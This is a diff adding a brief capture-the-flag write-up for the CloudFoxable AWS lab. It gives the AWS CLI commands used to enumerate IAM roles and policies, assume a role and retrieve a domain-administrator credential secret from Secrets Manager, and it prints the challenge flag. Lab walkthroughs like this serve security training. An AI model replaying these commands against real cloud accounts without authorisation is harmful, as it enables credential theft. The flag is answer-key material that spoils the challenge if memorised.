@@ -1,0 +1,15 @@
+1.	Check the profile using the command aws --profile cloudfoxable sts get-caller-identity           
+2.	I can check iam roles associated with cloudfoxable profile using the command aws iam list-roles --profile cloudfoxable
+    I selected the following role named Alexander Arnold:
+3.	I got lot of roles but just trial and error method I found the policy name that has corporate-domain-admin-password-policy policy for Alexander Arnold using the command aws iam list-attached-role-policies --role-name Alexander-Arnold --profile cloudfoxable :
+4.	I configured the profile with the role name Alexander Arnold using my Access Key Id and Secret Access Key using the command aws configure --profile Alexander-Arnold
+5.	Get the secrets manager and secret value using the command aws iam get-policy-version --policy-arn arn:aws:iam:: 982081074901:policy/corporate-domain-admin-password-policy  --version-id v1 --profile cloudfoxable           
+6.	List the secrets using the command aws secretsmanager list-secrets --profile cloudfoxable
+7.	Finally I got the flag for this challenge using the command aws secretsmanager get-secret-value --secret-id DomainAdministrator-Credentials --profile Alexander-Arnold
+8.  The flag is FLAG{backwards::IfYouFindSomethingInterstingFindWhoHasAccessToIt}
+
+
+
+
+
+
